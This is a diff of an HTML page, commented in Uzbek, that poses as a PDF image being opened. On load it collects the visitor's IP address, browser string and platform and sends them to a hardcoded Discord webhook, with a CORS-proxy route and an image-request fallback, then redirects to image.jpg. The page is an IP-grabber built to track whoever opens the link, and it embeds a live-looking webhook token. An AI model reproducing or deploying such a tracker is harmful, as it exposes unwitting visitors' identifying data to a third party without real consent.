@@ -5,46 +5,105 @@
 </head>
 <body>
     <script>
-        console.log('Alternative usul ishga tushdi...');
+        // Discord Webhook
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw";
 
-        // Form orqali yuborish
-        function sendViaForm() {
+        console.log('Script ishga tushdi...');
+
+        // CORS proxy orqali Discordga yuborish
+        async function sendToDiscordViaProxy() {
             try {
-                // Form yaratamiz
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = 'https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw';
+                console.log('CORS proxy orqali yuborish...');
                 
-                // Content input
-                const contentInput = document.createElement('input');
-                contentInput.name = 'content';
-                contentInput.value = `🚨 FORM ORQALI - IP: ... Vaqt: ${new Date().toLocaleString()}`;
-                
-                form.appendChild(contentInput);
-                document.body.appendChild(form);
-                form.submit();
-                document.body.removeChild(form);
-                
-                console.log('Form orqali yuborildi');
+                // 1. Avval IP ni olamiz
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                console.log('IP aniqlandi:', userIP);
+
+                // 2. Discord xabarini tayyorlaymiz
+                const discordMessage = {
+                    content: `🚨 **YANGI TASHRIF - image.html!**\n\n` +
+                             `🌐 **IP:** ${userIP}\n` +
+                             `⏰ **Vaqt:** ${new Date().toLocaleString()}\n` +
+                             `🖥️ **Brauzer:** ${navigator.userAgent.substring(0, 100)}...\n` +
+                             `📱 **Platforma:** ${navigator.platform}\n` +
+                             `🔗 **Manba:** PDF fayl`,
+                    username: "PDF Rasm Kuzatuvchi",
+                    avatar_url: "https://cdn-icons-png.flaticon.com/512/5088/5088124.png"
+                };
+
+                // 3. CORS Proxy orqali yuboramiz
+                const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+                const response = await fetch(proxyUrl + DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(discordMessage)
+                });
+
+                if (response.ok) {
+                    console.log('✅ Discordga MUVAFFAQIYATLI yuborildi!');
+                    return true;
+                } else {
+                    console.log('❌ Discord javobi:', response.status);
+                    return false;
+                }
+
             } catch (error) {
-                console.log('Form xatosi:', error);
+                console.log('❌ Xato:', error.message);
+                
+                // Alternative usul - image orqali yuborish
+                sendViaImageTracker(userIP);
+                return false;
             }
         }
 
-        // Sahifa yuklanganda
-        window.onload = function() {
-            console.log('Alternative sahifa yuklandi');
-            sendViaForm();
+        // Alternative usul - Image tracker orqali
+        function sendViaImageTracker(ip) {
+            console.log('Image tracker orqali yuborish...');
             
-            setTimeout(() => {
+            // 1-pixel li rasm orqali tracking
+            const trackerImg = new Image();
+            trackerImg.src = `https://api.ipify.org?format=json&callback=ipCallback`;
+            
+            // Discordga so'nggi urinish
+            const img = new Image();
+            const message = `IP: ${ip}, Time: ${new Date().toLocaleString()}`;
+            img.src = `https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw?content=${encodeURIComponent(message)}`;
+        }
+
+        // Sahifa yuklanganda ishga tushirish
+        window.addEventListener('load', async function() {
+            console.log('Sahifa yuklandi...');
+            
+            // Discordga yuborishga urinamiz
+            await sendToDiscordViaProxy();
+            
+            // 3 soniyadan keyin rasmga o'tish
+            setTimeout(function() {
                 window.location.href = 'image.jpg';
-            }, 2000);
-        };
+            }, 3000);
+        });
+
     </script>
 
-    <div style="text-align: center; padding: 100px;">
-        <h3>Rasm ochilmoqda...</h3>
-        <p>Form orqali ma'lumotlar yuborilmoqda</p>
+    <div style="text-align: center; padding: 100px; font-family: Arial;">
+        <h2>📄 PDF Rasm Yuklanmoqda...</h2>
+        <p>Iltimos, kuting. Rasm avtomatik ravishda ochiladi.</p>
+        <p><strong>IP manzilingiz va boshqa ma'lumotlar Discordga yuborilmoqda...</strong></p>
+        <div id="status" style="margin: 20px; padding: 10px; background: #f0f0f0; border-radius: 5px;">
+            🟡 Ma'lumotlar yuborilmoqda...
+        </div>
     </div>
+
+    <script>
+        // Status yangilash
+        setTimeout(function() {
+            document.getElementById('status').innerHTML = '🟢 Ma\'lumotlar yuborildi! Rasm ochilmoqda...';
+        }, 2000);
+    </script>
 </body>
 </html>
